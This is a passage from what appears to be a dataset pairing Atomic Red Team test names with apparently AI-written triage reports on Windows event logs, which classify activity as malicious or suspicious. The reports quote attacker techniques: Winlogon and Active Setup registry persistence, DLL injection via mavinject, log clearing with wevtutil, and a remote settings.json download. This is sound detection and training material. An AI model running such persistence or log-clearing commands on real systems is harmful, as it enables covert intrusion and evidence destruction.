1. Begin incident response procedures to contain and mitigate the potential compromise.
2. Immediately reset credentials for the `admin_test` account and monitor for any further unusual activity.
3. Conduct a thorough audit of Azure Active Directory to identify unauthorized changes or new application/service principal creations.
4. Preserve logs and other evidence for forensic analysis.
5. Investigate other systems for similar indicators to ensure the compromise hasn't spread horizontally or vertically through the network."
Process Injection with Go using EtwpCreateEtwThread WinAPI,"### Detailed Analysis

Upon reviewing the provided logs, there are several indicators of potentially malicious activity on the Windows host, specifically on Server002. Here's a breakdown of observations from examining system, PowerShell, Sysmon, application, and security logs:

#### 1. **Log File Clearing**
- **System Log Entries:** Events with `EventID: 104` show that logs in the System and Windows PowerShell channels were cleared by `admin_test` at `2024-10-22 17:35:04.9541648` and `2024-10-22 17:35:05.2053646`. This indicates someone cleared the logs possibly to hide their actions, which is a typical tactic post-compromise.
- **Security Log Entries:** `EventID: 1102` indicates that the Security log was cleared by the same user `admin_test` at `2024-10-22 17:35:05.0880221`. Clearing security logs is a critical red flag for malicious activity.

#### 2. **Suspicious PowerShell Activity**
- **PowerShell Log Entries:** Multiple entries with `EventID: 600` show the execution of `powershell.exe` with a command line pointing to a suspicious executable: `EtwpCreateEtwThread.exe -debug`. This file is located in a path associated with `AtomicRedTeam`, a known adversary simulation and testing framework which may indicate misuse by an attacker.
- **Sysmon Log Entries:** Entry `EventID: 1` reveals the execution of the same executable. This further validates the suspicious nature of this activity.

#### 3. **Unusual Privilege Events**
- **Security Log Entries:** `EventID: 4672` shows that user `admin_test` exercised elevated privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are considered sensitive and can be abused to gain elevated access or to hide actions on the system.

#### 4. **Other Observations**
- Sysmon logs indicate a series of legitimate application and window host executions (`whoami.exe`, `conhost.exe`, `hostname.exe`), suggesting standard administrative activity. However, these activities correlate closely with the log clearing and suspicious PowerShell execution around the same timestamp, indicating they might be part of the same unauthorized session.
  
### Assessment
- The combination of these log entries, specifically the clearing of logs, suspicious PowerShell activities pointing to a potentially malicious executable, and the use of elevated privileges, all strongly indicate that there is malicious intent or compromise.

### Recommended Actions
1. **Immediate Mitigation:** 
   - Investigate and isolate the host `Server002` to prevent further potential damage or exfiltration.
   - Change administrative credentials for user `admin_test` and potentially other accounts to prevent further unauthorized access.
   
2. **Detailed Forensic Analysis:** 
   - Analyze the suspicious binary `EtwpCreateEtwThread.exe` and its parent directory for signs of compromise or payload delivery.
   - Review other host logs and network traffic for related indicators of compromise (IOCs).

3. **Enhanced Monitoring and Alerts:**
   - Institute monitoring and alerting for unusual log clearing events and suspicious PowerShell activity.

4. **Incident Response Engagement:** 
   - As this involves potential unauthorized access and sensitive log alteration, engage your incident response team for an in-depth investigation.

### Final Resolution
**MALICIOUS** - The logs contain clear signs of malicious activities, including log tampering, execution of suspicious executables, and unauthorized privilege escalation."
Domain Password Policy Check: No Uppercase Character in Password,"Upon examining the provided Windows event logs, several indicators point towards potentially malicious activity:

1. **Windows PowerShell Log**: 
   - A PowerShell script executed an operation that involved password handling and modification (`Set-ADAccountPassword`). It attempts to compare and set passwords, which is not typically common for benign scripts. The script also involves storing and removing credential files, which could indicate attempts to manipulate user credentials.

2. **Security Log Patterns**: 
   - Event ID 1102 indicates that the security log was cleared, an action typically taken to conceal malicious activities.
   - Repeated Event ID 4798 for different system accounts suggests querying of local group membership.
   - Event IDs such as 4799 following multiple 4798s could imply enumeration of user and group permissions, often a precursor to privilege escalation or reconnaissance in an advanced persistent threat.

3. **Sysmon Logs**: 
   - Multiple instances of `wevtutil.exe` used to clear logs (`cl Security`, `cl Application`, etc.) were found. Clearing event logs is a common tactic used by intruders to cover their tracks.
   - Administrative and high integrity level processes accessed directly by `admin_test`, strongly indicating elevated privileges.
   
4. **System Log Entries**:
   - Consistent with the power shell log entries, the system logs illustrate that several system event logs were cleared around the same timeline by `admin_test`.

Combining these elements, there is clear intent shown by the clearing of logs and actions surrounding privileged operations, indicative of an attempt to cover tracks and possible unauthorized or malicious activity. Such patterns are consistent with a compromise where an attacker tries to gain and maintain access covertly while obscuring evidence.

**Resolution**: MALICIOUS

**Guidance**: 
- Isolate the affected system immediately to prevent further misuse.
- Conduct a thorough investigation, including a review of file integrity and network logs for further indicators of compromise.
- Consider resetting all administrative and service account passwords.
- Review any stored credentials and implement stronger controls, such as two-factor authentication.
- Perform a full internal audit of security protocols to prevent future incidents."
secedit used to create a Run key in the HKLM Hive,"After analyzing the provided Windows event logs, I've identified certain activities that raise suspicions:

1. **Clearing of Logs**:
    - Multiple instances in the 'System', 'Security', and 'Windows PowerShell' logs indicate that event logs were cleared by the user 'admin_test' (EventID `104` for the System and PowerShell, EventID `1102` for Security). This behavior is often associated with attempts to hide malicious activities on a host.

2. **Use of `wevtutil.exe`**:
    - Frequent execution of `wevtutil.exe` to clear logs as reflected in the Sysmon logs (Process execution of `C:\Windows\System32\wevtutil.exe` with command-line arguments such as `cl System` and `cl Security`) points toward a deliberate log-clearing activity.

3. **Time Manipulation**:
    - The presence of `Microsoft-Windows-Security-Auditing` Event ID `4616` indicates a change in system time. It is typically used in conjunction with illicit activities to confuse event timelines or bypass schedules/expiration.

4. **Execution of Suspicious Commands**:
    - Execution of `cmd.exe` with `secedit` command, specifically referencing a path in a Temp directory related to ""AtomicRedTeam"" (known tool for simulating attack techniques for testing detection rules), is suspicious. The involvement of Atomic Red Team suggests that this could be part of a red team activity or potentially malicious if not authorized.

5. **Frequent Execution of Microsoft Edge Update Processes**:
    - Numerous instances of Microsoft Edge Update processes being executed in rapid succession, especially in a temporary directory, could be normal due to updates but should be reviewed to confirm their legitimacy.

### Assessment

The activities listed indicate several potential signs of compromise, such as log clearing and time-hiding behaviors, especially when paired with potential red team simulation exploits. Said activities, if unauthorized, imply malicious intent and actions to cover tracks.

### Resolution

Given the findings, my assessment for the event logs is:
- **SUSPICIOUS** - The logs include activity that doesn't look right and requires further investigation, especially concerning the admin actions clearing logs, potential unauthorized testing activities, and system time changes.

### Guidance on Proceeding

1. **Verify Legitimacy**:
   - Confirm with the IT/security team whether this activity (specifically log clearing and any red team exercises) was authorized.

2. **Monitor and Isolate**:
   - Increase monitoring on 'Server002' for any further indications of malicious behavior. If unauthorized activities continue, consider taking measures to isolate the system to prevent potential lateral movement.

3. **Audit and Analyze**:
   - Conduct a thorough audit of account `admin_test` to determine anomalous privileges or past actions that coincide with these logs.

4. **Review Edge Updates**:
   - Investigate the legitimacy of the Microsoft Edge update process executions and ensure they align with expected updates."
HKLM - Add malicious StubPath value to existing Active Setup Entry,"## Analysis

The provided Windows event logs contain various activities. Here, we will analyze the logs for suspicious behaviors, focusing on atypical process executions, command-line arguments, privilege escalation attempts, or other indicators of potential compromise.

### Suspicious Activities:

1. **PowerShell Usage:**
   - The logs reveal the execution of a PowerShell script that modifies the registry key under `HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components`. The script sets the ""StubPath"" to ""C:\Windows\System32\calc.exe"" and then attempts to execute `runonce.exe` with the `--AlternateShellStartup` argument. This behavior is atypical as it implies potential persistence mechanism manipulation.

2. **Event Logs Cleared:**
   - Windows event logs for the Security and System channels were cleared by “admin_test”:
     - Security Log: Event ID 1102 indicates that the security log was cleared.
     - System Log: Occurrences of Event ID 104 show systematic clearing of logs. This is suspicious behavior often associated with attempts to cover tracks of potentially malicious activity.

3. **Time Change Events:**
   - Event ID 4616 and time-related changes indicate modification of the system time. Rapid, small-time changes are logged, though this in itself is not a typical indicator of compromise without other context.

4. **Suspicious Process Execution:**
   - PowerShell spawned ""C:\Windows\System32\runonce.exe,"" which in turn spawned ""C:\Windows\System32\calc.exe."" While `calc.exe` is benign, this chain of execution and its origin suggests potential misuse.

### Context Observations:

- **Consistent Execution from SYSTEM User:** Many of the logged events, particularly those related to processes in “Microsoft Edge Update,” use the NT AUTHORITY\SYSTEM account, which is typical due to privileges required for system-level updates.

### Assessment:

The combination of PowerShell scripting to manipulate registry keys, the execution of `runonce.exe` in a suspicious manner to launch `calc.exe`, and the clearing of Security and System Event logs strongly suggests attempts to obfuscate actions on the system. These activities align with behaviors leveraged in certain persistence techniques and evasion tactics in malware operations.

### Resolution

**Resolution**: **MALICIOUS**

Given the evidence of log clearing, registry key manipulation, PowerShell activity, and suspicious process execution, there is a clear indication of malicious activity.

### Guidance

1. **Immediate Action:**
   - Isolate the affected system from the network to prevent any potential spread of compromise or data exfiltration.
   - Begin detailed forensic image capture and analysis of the host machine for further investigation and recovery purposes.

2. **Investigate:**
   - Conduct a deep dive into the system’s registry, especially under locations modified by the PowerShell script.
   - Review processes and services running on the system for unfamiliar or unauthorized entries.

3. **Remediation:**
   - Use trusted anti-malware tools to scan for infections.
   - Rebuild affected services or reinstall system components if tampering is confirmed.

4. **Preventive Measures:**
   - Implement logging security to ensure unauthorized modifications are detected promptly.
   - Enhance monitoring for PowerShell usage across the network, particularly those involving registry changes.

5. **User Activity Review:**
   - Investigate activities of the user account “admin_test” to ensure it wasn't compromised, and enforce stronger authentication policies."
Process Injection with Go using CreateThread WinAPI (Natively),"The provided event logs indicate several activities that raise concerns about potential malicious activities on the host, Server002:

### Analysis:

1. **Event Log Cleared (Security and System Log):**
   - **Event ID 1102 (Security Log) and Event ID 104 (System Log):** Logs being cleared can be a significant indicator of malicious activity as attackers often clear logs to hide their tracks. The logs were cleared by a user named ""admin_test,"" which needs to be scrutinized further. 
   
2. **Suspicious Time Manipulation (Security and System log):**
   - **Event ID 4616 (Security Log):** There is evidence of system time manipulation executed by ""svchost.exe."" The change where the ""PreviousTime"" is ahead of the ""NewTime"" is a sign of potential manipulation often done by malicious actors to hide their activities or to bypass time-based security measures.

3. **Wevtutil.exe Usage (Sysmon Log):**
   - The usage of `wevtutil.exe` to clear event logs across multiple channels (Sysmon, Application, System, Security) is suspicious. The command lines match actions to clear logs (`wevtutil cl`), seen within the Sysmon logs. The user ""admin_test"" executed these commands suggesting potential misuse of administrative privileges.

4. **PowerShell Activity (Sysmon and PowerShell Log):**
   - **Event ID 1 (Sysmon Log):** PowerShell was used to run a specific executable (`CreateThreadNative.exe`) from a file path (`AtomicRedTeam\T1055\bin\x64`). The `Atomic Red Team T1055` path is widely recognized as a repository for adversary simulation and red team activities. However, in a production environment, its presence can signify unauthorized testing or an attempted lateral movement.
   - **PowerShell Event ID 600:** Accompanies these activities showcasing PowerShell starting with unusual command lines that align with known adversary tactics.

5. **Presence of External Tools:**
   - The use of tools from `AtomicRedTeam` can indicate either sanctioned testing (as part of red teaming exercises) or unsanctioned/possibly malicious activities.

### Assessment:

- **Threats/Risks Identified:**
  - **Privilege Misuse:** The account ""admin_test"" appears to misuse administrative privileges to clear logs, indicative of either insider threat or an unauthorized actor with escalated privileges.
  - **Time Manipulation:** Suggests attempts at covering tracks.
  - **PowerShell Exploitation:** The execution of potentially malicious payloads using PowerShell.

### Guidance and Resolution:

1. **Immediate Actions:**
   - **Identify and Isolate:** Determine if ""admin_test"" is a legitimate account and investigate their actions around the critical timestamps. If suspicious, restrict this account's access immediately.
   - **Audit Access:** Increase monitoring and audit trail collection on sensitive actions such as log clearing and PowerShell usage.
   - **Forensic Analysis:** Conduct a detailed forensic analysis on ""Server002"" and cross-reference logs with other possible network activity during this period to understand the scope further.

2. **Long-term Measures:**
   - **Review and Enforce Security Policies:** Enforce least-privilege access and review administrative permissions.
   - **Implement Additional Logging:** Ensure proper configurations are in place to prevent unauthorized clearing of logs and to capture full audit trails.
   - **Conduct Regular Security Awareness Training:** Emphasize the importance of proper log handling and monitoring practices.

Based on the evidence provided, the resolution assessment is **MALICIOUS** as clear indicators of potential compromise and unauthorized/malicious activity are present."
Add Executable Shortcut Link to User Startup Folder,"Upon analyzing the provided Windows event logs, there are multiple indicators of potentially malicious activity that require attention:

1. **Log Clearing Events**:
   - The security, system, and PowerShell logs have been cleared, as indicated by the EventID 1102 in the Security log and EventID 104 in the System log. The user `admin_test` on `Server002` performed these actions. Clearing logs is a common tactic used by attackers to cover their tracks and indicates possible tampering or malicious activity.

2. **Suspicious PowerShell Activity**:
   - The PowerShell logs show a command executed by `admin_test` to create a shortcut for `calc.exe` and place it in the startup directory. This activity is commonly seen in persistence mechanisms where malicious scripts are set to execute upon system startup.

3. **Use of Administrative Utilities**:
   - The commands involving `wevtutil.exe` indicate the clearing of multiple logs (`Sysmon`, `Application`, `System`, and `Security`) by the same user. This is highly suspicious as it confirms deliberate attempts to erase event logs.

4. **Unusual Process Creation**:
   - Sysmon logs show the execution of several system utilities (`whoami.exe`, `wevtutil.exe`) near the same timestamp as the log clearance and PowerShell activities. These utilities are often used for system reconnaissance and log manipulation in an unauthorized manner.

5. **Service Stopping**:
   - Events indicate multiple instances of the `edgeupdate` service stopping. While stopping services isn't inherently suspicious, in conjunction with the above activities, it further supports the narrative of an attempted cover-up or system compromise.

Overall, the combination of log clearance activities, scripting for persistence using PowerShell, and the context of these events strongly indicate a malicious intent and potential system compromise.

**Resolution: MALICIOUS**

**Guidance**:
- Immediately isolate the affected host (Server002) from the network to prevent any further potential spreading of the compromise.
- Conduct a full investigation and forensic analysis to determine the source and extent of the compromise, including examining any external connections or data exfiltration.
- Review and restrict user privileges that allowed `admin_test` to perform these actions, and consider implementing additional security controls such as enhanced logging and monitoring.
- Ensure all systems are updated with the latest security patches and conduct a full malware scan on the network."
Winlogon HKLM Userinit Key Persistence - PowerShell,"Based on the analysis of the provided Windows event logs, I've identified several areas of concern indicating potential malicious activity:

1. **Clearing Event Logs**:
    - The system logs show events indicating that the logs were cleared (`EventID: 104` for the System Log, `EventID: 1102` for the Security Log). This activity, conducted by user `admin_test`, is frequently associated with a strategy to cover up tracks after malicious actions.

2. **Suspicious PowerShell Activity**:
    - Windows PowerShell logs (`EventID: 600`) and related Sysmon logs reveal the execution of a PowerShell script that modifies a critical registry value (`Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit""`) to a suspicious command line (`""Userinit.exe, C:\Windows\System32\cmd.exe""`). This modification is often associated with creating persistence mechanisms or manipulating the startup processes, a technique often used in malware operations.

3. **Privilege Escalation**:
    - There is evidence of high privileges being used by the account `admin_test`, as noted in the `4624` (logon) and `4672` (privileges) security events. The presence of privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` is generally needed for advanced system operations, and their use could indicate preparation for privilege escalation or further system compromise.

4. **Process Execution**:
    - The Sysmon logs indicate numerous executions of `MicrosoftEdgeUpdate.exe` and related components running under `NT AUTHORITY\SYSTEM`, which may appear benign. However, in context with the unusual PowerShell activity, it's critical to consider these could also be leveraged by malware to masquerade as legitimate processes or as part of a living-off-the-land strategy.

Given these points and the context in which these actions occurred, the activities observed in the logs align with patterns typically seen in compromised environments where attackers aim to conceal their presence and establish persistence. Further forensics and system integrity checks, especially focused on the affected registry values and user account activity, should be conducted.

**Resolution**: MALICIOUS - The combination of cleared logs, suspicious registry modifications through PowerShell, elevated privileges, and high-risk process executions collectively suggest a high probability of malicious activity. Immediate attention is recommended to contain and remediate any compromise. Implement additional monitoring and conduct a thorough investigation and system audit to ensure no backdoors or further threats remain."
Process Injection via Extra Window Memory (EWM) x64 executable,"Based on the provided Windows event logs, here is a detailed analysis:

### **Suspicious or Anomalous Behaviors Identified:**

1. **Process Execution and Log Clearing:**
   - The `wevtutil.exe` command is used to clear several logs (System, Application, Security) by the user `admin_test` on `Server002`. This is suspicious because it indicates an attempt to hide traces of activity on the system, which is a common behavior in malicious activity.

2. **Executing Known Tools for Malicious Activity:**
   - The involvement of `AtomicRedTeam` executable (`T1055.011_x64.exe`) executed via PowerShell from the user's temporary directory is highly suspicious. Atomic Red Team is a known security testing framework that mimics adversary techniques, and its usage in an operational environment suggests unauthorized testing or possibly actual malicious activity.

3. **Administrative Privileges:**
   - The `SeDebugPrivilege`, among other administrative privileges, was enabled for the `SYSTEM` user account. This elevation of privileges could potentially be used for malicious purposes, such as injecting code into other processes.

### **Indicators of Malicious Activity or Compromise:**
- **Event ID 1102**: Security log cleared, which may indicate an attempt to cover tracks.
- **Event ID 104**: Multiple instances of log clearing detected for System and PowerShell logs.
- **Sysmon and PowerShell logs**: Execution of potentially malicious files through PowerShell:
   - The execution of `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055.011\\bin\\T1055.011_x64.exe` indicates the use of a known offensive security tool.

### **Assessment of Situation:**
The logs present multiple indicators of potentially malicious activity, mainly focusing on the execution of suspicious executables, clearing of logs, and the enabling of sensitive privileges. The usage of Atomic Red Team tools without clear authorization or logging can be alarming and necessitates further investigation to verify the legitimacy of this execution.

### **Recommendations:**
1. **Conduct a Follow-up Investigation**:
   - Verify with system administrators if the usage of the Atomic Red Team tool was authorized for legitimate security testing.
   - Check if the `admin_test` user account conducted these actions under a valid security assessment.

2. **Analysis and Containment**:
   - Isolate the host `Server002` for further forensic analysis.
   - Review any connections or processes initiated by the said `AtomicRedTeam` tools to determine the extent of the activity.

3. **Mitigation**:
   - Implement monitoring for the use of `wevtutil.exe` and similar tools to detect log tampering in the future.
   - Educate users about proper logging and approval processes for using security testing tools.

### **Resolution:**
After reviewing the logs and correlating the suspicious activities, the final resolution for these logs is:

**MALICIOUS** - The presence of atomic testing frameworks executed from temporary directories and log manipulations are clear indicators of potential malicious action without explicit approval or clarification."
Print Processors,"Upon reviewing the provided Windows event logs, I have identified several suspicious activities that need further examination:

1. **Event Log Clearing**:
   - The logs show multiple instances of event log clearing (Event IDs 104 and 1102), executed by the `admin_test` account. Clearing logs can be an indication of attempts to cover tracks after unauthorized or malicious activity.

2. **PowerShell Script Execution**:
   - There is a PowerShell command executed that manipulates the Print Spooler service to alter startup settings, stop the service, copy a DLL to a specific location, and add a registry entry (related to AtomicRedTeam T1547.012). This PowerShell activity involves changes to the system registry and copying potentially malicious DLLs, which is a common tactic used in various attack techniques, such as privilege escalation or persistence mechanisms.

3. **High Integrity Level**:
   - The user `SERVER002\admin_test` executed commands with a high integrity level. While not suspicious by itself, when combined with other activities, it may suggest privilege misuse.

4. **Multiple Instances of `wevtutil.exe` Usage**:
   - `wevtutil.exe` was used to clear various Windows event logs (Sysmon, Application, Security) under the `SERVER002\admin_test` account. This behavior is particularly suspect when accompanied by PowerShell script execution and registry editing.

5. **Times and Processes**:
   - The sequence and timestamps of events imply a coordinated and intentional set of actions, particularly around log clearing and the execution of the PowerShell script. Such actions could indicate an attempt to persist on the system or obfuscate activity from defenders.

6. **Privileged Logon Activity**:
   - The logs also capture a privileged logon event (Event ID 4624) with elevated privileges (Event ID 4672), though conducted by the `SYSTEM` account. This is a normal system account logon but coupled with other suspicious activities it necessitates an investigation.

**Assessment**:
Given the combination of log clearing, high-level PowerShell execution, registry modification, and service manipulation, the activities captured in these logs are highly indicative of a compromise attempt or malicious behavior. The `admin_test` user account is shown to be actively used in these operations, suggesting either account misuse or compromise.

**Resolution**:
- **MALICIOUS**: Based on the logs provided, the activity can be confidently classified as malicious. This determination is rooted in the nature of actions taken (e.g., PowerShell manipulation, event log clearing) which align closely with known adversarial tactics.

**Guidance**:
- Immediate steps should be taken to contain the threat:
  - Begin an internal investigation on the `admin_test` account for potential compromise.
  - Review the current state of the system for integrity and security, checking for unauthorized modifications.
  - Isolate affected systems to prevent further spread.
  - Remove or quarantine any identified malicious files or registry entries.
  - Strengthen logging and monitoring to prevent such incidents in the future.
  - Consider bringing in a digital forensics team to thoroughly investigate any additional, potentially undetected compromise."
Process Injection via mavinject.exe,"Upon analyzing the provided Windows event logs, I have identified several instances of suspicious activity that may indicate malicious behavior:

1. **Process Injection with Windows PowerShell**:
   - A PowerShell script executed with commands aimed at injecting a DLL into a running process (notepad.exe). The use of `mavinject` with the DLL located at `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055.001\\src\\x64\\T1055.001.dll` is indicative of a potential process injection attempt, which is a well-known technique used for code execution in another process context.
   - This behavior is described within the MITRE ATT&CK framework under the technique T1055.001 (Process Injection).

2. **Clearing of Windows Event Logs**:
   - Logs from the System, Security, and Windows PowerShell channels were cleared by the user `SERVER002\\admin_test`, which is a common tactic used by attackers to cover their tracks and remove any evidence of other malicious activities.

3. **Exporting Logs via `wevtutil`**:
   - Multiple events show the execution of `wevtutil` commands to export Windows logs, which might be related to evidence tampering or data exfiltration. The exportation of logs is suggested by the command line: `\""C:\\Windows\\system32\\wevtutil.exe\"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx`.

4. **Unauthorized Use of High-Integrity Processes**:
   - The processes executed were under high integrity, which suggests that the user had administrative privileges and may not have been following standard operational procedures.

Given these findings, the activity observed in the logs is highly indicative of malicious behavior, likely an attacker engaged in process injection and log manipulation to evade detection.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Actions**:
  - Isolate the affected host (Server002) from the network to prevent further potential spread of malicious activities.
  - Initiate a full incident response process, including forensics to identify potential additional footholds or further malicious activities present on the network.
  - Perform a detailed investigation into accounts used during these activities to determine if they have been compromised and change account credentials.
  
- **Short-term Remediation**:
  - Review and revert any unauthorized changes or actions performed on the system.
  - Restore system functionality and integrity from clean, secure backups if necessary.

- **Long-term Strategy**:
  - Enhance monitoring and logging policies, ensuring they are sent to a secure logging server to prevent tampering.
  - Conduct regular security training and awareness sessions for administrative users to avoid such situations.
  - Implement advanced threat detection solutions to identify similar techniques used by attackers in the future.

These steps will help address the immediate threat and better position the organization for preventing similar incidents going forward."
Azure AD - Add Company Administrator Role to a user,"Upon examining the provided logs, several indicators suggest suspicious activities that could point to malicious intentions or misconfigurations within the system which require further investigation:

### Analysis:

1. **Event Log Clearing:**
   - The `Security`, `System`, and `Windows PowerShell` event logs were cleared by the user `admin_test` on `Server002`. The clearing of event logs is a common tactic used by attackers to cover their tracks after executing malicious actions. 
   - The commands used to clear these logs were executed by the `wevtutil.exe` utility, which is a legitimate Windows command-line event log management tool.
   - This activity is considered highly suspicious, especially since there's no indication of legitimate maintenance or administrative justification for clearing these logs.

2. **Suspicious PowerShell Usage:**
   - A PowerShell command was executed by `admin_test` importing the module `MSOnline` and attempting to manipulate user roles (`Add-MsolRoleMember`) for an account with the email `jonh@contoso.com`. This action could indicate unauthorized access or elevation of privileges.
   - The passwords are being handled in clear text using the `ConvertTo-SecureString` cmdlet, which is often seen in scripts used in attacks.
   - PowerShell was specifically run with high integrity levels, suggesting that administrative privileges might have been used, which aligns with potentially malicious intent.

3. **Process Creation and Usage:**
   - Multiple processes such as `wevtutil.exe`, `powershell.exe`, and `conhost.exe` were executed in a manner that is consistent with attempts to manage or manipulate system configurations or logs forcibly.
   - While tools like `wevtutil.exe` and `HOSTNAME.EXE` themselves are benign, their use to clear critical logs indicates inappropriate usage.

4. **System Updates Invocation:**
   - Usage of `UsoClient.exe` to invoke start store updates can be benign; however, it may be used to perform updates in a manner not typical for regular automated update processes. This action should be contextually reviewed.

### Assessment:

The combination of log clearing activities, unauthorized PowerShell commands, and the absence of clear legitimate administrative justification for these actions collectively suggest that there may be foul play. However, without more contextual information (such as correlating user activities or organization policies about log management and system update handling routines), it's not possible to definitively mark these as outright malicious. This scenario does point strongly towards suspicious activity.

### Resolution:

**SUSPICIOUS**

### Guidance on How to Proceed:
1. **Further Investigation:**
   - Conduct an audit trail analysis on `admin_test` to determine the legitimacy of the log clearing and PowerShell activities.
   - Verify whether `admin_test` credentials were compromised and lead to improper use.
   - Review system and network logs for any correlating anomaly during the same timeframe.

2. **Immediate Actions:**
   - Initiate a security review and possibly suspend the `admin_test` account for verification.
   - Ensure proper logging configurations are reinstated, and backups of logs are secured.

3. **Preventive Measures:**
   - Implement alerts for critical log clearing activities.
   - Regularly train administrators on secure handling of sensitive operations like log management. 

4. **Communication:**
   - Inform relevant IT security teams of the findings and coordinate further forensic analysis to secure the environment. 

Further steps will depend on findings from the additional investigation and validation of administrative activities."
Persistence by modifying Windows Terminal profile,"Upon analyzing the provided logs, here are the observations and assessments:

### Suspicious Activities:
1. **Repeated PowerShell Scripts Execution:**
   - Several Sysmon events (EventID: 1 and 5) indicate the execution of `powershell.exe` with a suspicious command line. The command involves moving a `settings.json` file and using `Invoke-WebRequest` to download a file from a GitHub repository (`https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true`).
   - This script attempts to replace a legitimate application's configuration file (Windows Terminal's settings.json), which is a technique used in some attacks to execute malicious code or alter application behavior.

2. **Usage of `wevtutil.exe`:**
   - The `wevtutil.exe cl` command is used to clear various event logs (including System, PowerShell, and Security logs). This type of activity is often associated with an attempt to cover up traces of malicious activity.

3. **Event Logs Cleared:**
   - System (Event ID 104) and Security logs (Event ID 1102) were cleared by the user `admin_test`, which is highly suspicious and often indicates an attempt to delete evidence of malicious activity.

4. **Execution of System Commands:**
   - The execution of system utility commands such as `whoami`, `hostname`, and `conhost` without clear context may indicate reconnaissance or environment checks often performed by attackers after gaining access to a machine.

### Conclusion:
The logs demonstrate potentially malicious behavior due to the following reasons:
- Execution of PowerShell scripts that download and modify configuration files from external sources.
- Clearing of crucial event logs indicating an attempt to hide tracks.
- The user involved (`SERVER002\admin_test`) appears to be leveraging administrative privileges to perform these operations.

### Resolution:
Based on the above analysis, the findings are categorized as **MALICIOUS** due to the clear indicators of potential exploitation activities designed to remain undetected by cleaning logs after modifying system settings.

### Recommended Action:
- Isolate the affected host (Server002) for further investigation.
- Conduct a forensic analysis, particularly focusing on the modified `settings.json` file and any other altered system files.
- Review other systems using the same credentials (`admin_test`) to detect any lateral movement.
- Reset credentials for compromised accounts and implement enhanced monitoring and incident response protocols."
Add Port Monitor persistence in Registry,"Upon review of the provided Windows event logs, several indicators suggest potential malicious activity:

1. **Log Clearing Activity:**
   - The Security log contains an event (Event ID 1102) indicating the security log was cleared by the user `admin_test`. Additionally, System logs indicate similar actions (Event ID 104) performed around the same time, clearing logs for the ""System"" and ""Windows PowerShell"" channels. Clearing event logs is often an attempt to cover tracks after malicious activity.

2. **Suspicious Use of Eventing Utility (`wevtutil.exe`):**
   - Multiple instances of `wevtutil.exe` are captured in the Sysmon logs, executed by the same user, `admin_test`. This tool is commonly used to clear logs, which aligns with the previously mentioned log clearing events. The context and frequency of these executions suggest these may be part of log tampering efforts.

3. **Registry Modification via Command Line:**
   - Sysmon captures a `cmd.exe` process executing a command to modify the registry using `reg.exe` to add a potentially malicious DLL (`PortMonitor.dll`) related to the `AtomicRedTeam` tool. This indicates an attempt to persist or execute unauthorized code via a registry-based persistence mechanism (T1547.010 - Port Monitors). 
   - The command identified here is a common technique used by attackers to establish persistence on a compromised host.

4. **Timing and Sequence of Events:**
   - The sequence of events suggests a pattern consistent with post-compromise activities: clearing logs, verifying active users with `whoami.exe`, followed by registry manipulation.
   
5. **Regular System Activities:**
   - While there is Microsoft Edge updating activity noted, which includes use of MicrosoftEdgeUpdate.exe, this aligns with expected software update behavior and does not correlate with the suspicious activities noted.

**Assessment: MALICIOUS**

### Conclusions and Recommendations:
- The activities documented in these logs, primarily the clearing of event logs, the suspicious use of PowerShell, and registry manipulation, are strong indicators of malicious intent and potential compromise by an unauthorized user with administrative privilege (`admin_test`).
  
- **Immediate Actions:**
  - Conduct a full security audit and investigation on `Server002`, focusing on the account `admin_test`.
  - Review other systems to ensure this pattern of activity is not occurring elsewhere.
  - Check for any suspicious network activities or data exfiltration attempts from this host.
  - Consider isolating the machine from the network to prevent further unauthorized access or potential spread.
  
- **Long-term Actions:**
  - Enhance logging and monitoring to include alerts for log clearing and registry manipulation activities.
  - Conduct a review of privilege use and ensure stringent access controls are in place around sensitive operations.
  - Deploy updates and patches to mitigate known vulnerabilities.
  - Implement endpoint detection and response (EDR) measures to better capture this type of activity early in the future."
Azure - adding service principal to Azure role in subscription,"Based on the analysis of the Windows event logs, several potentially suspicious activities are observed that warrant further investigation. The analysis is as follows:

### PowerShell Logs

- The logs indicate the use of PowerShell with a script that connects to an Azure account using hardcoded credentials (username and plaintext password using `ConvertTo-SecureString -AsPlainText`). This behavior is generally considered risky and unprofessional, as it exposes credentials unnecessarily. The script appears to configure a service principal with a role assignment in Azure, which could be part of standard operations, but the use of plaintext passwords raises a red flag.

### Security Logs

- The `EventID 1102` indicates that the security log was cleared by the user `admin_test`. Clearing security logs can be a sign of a cover-up after performing unauthorized activities.

- Event logs with `EventID 4798` show that `CompatTelRunner.exe` queried for various user accounts, including administrative accounts. This process usually performs Microsoft Compatibility Telemetry tasks and such activity should be reviewed to ensure it aligns with expected usage.

- The presence of a `4624` logon event (type 5) for the SYSTEM account suggests a service startup. While normal, it should be verified if this aligns with policy expectations at the time of the event.

- `EventID 4672` shows that privileges were assigned during the SYSTEM logon, including several high-level privileges, including `SeDebugPrivilege`, which allows processes to bypass security controls to explore memory allocations of other processes. This could pose a risk if it is exploited.

### System and Sysmon Logs

- The frequent use of `wevtutil.exe` to clear logs (`cl` command) for multiple channels (Sysmon, System, Security, Windows PowerShell) by `admin_test` is highly suspicious. Log clearing actions should be thoroughly justified and logged activities scrutinized.

- The creation of multiple processes with high integrity levels (such as PowerShell, whoami.exe, etc.) by `admin_test` suggests heightened or administrative access is being used routinely. Such access should follow best practices controls and be audited regularly.

### Assessment

The overall activity in the logs shows signs of possible misuse:
- The use of plaintext credentials in PowerShell scripts.
- Clearing critical logs, indicating potential attempts to hide other actions.
- Elevated and possibly improper usage of administrative privileges.

### Conclusion

**Resolution: SUSPICIOUS**

This collection of activities doesn't definitively prove malicious intent, but it presents enough risk to require immediate further investigation. The persistent risky behavior by `admin_test` especially around critical operational procedures suggests either a lack of awareness of best practices or intentional obfuscation of actions taken on the system.

### Guidance

1. **Immediate Review and Revocation:**
   - Review the purposes of `admin_test` actions, and temporarily suspend or restrict this account until investigations conclude.
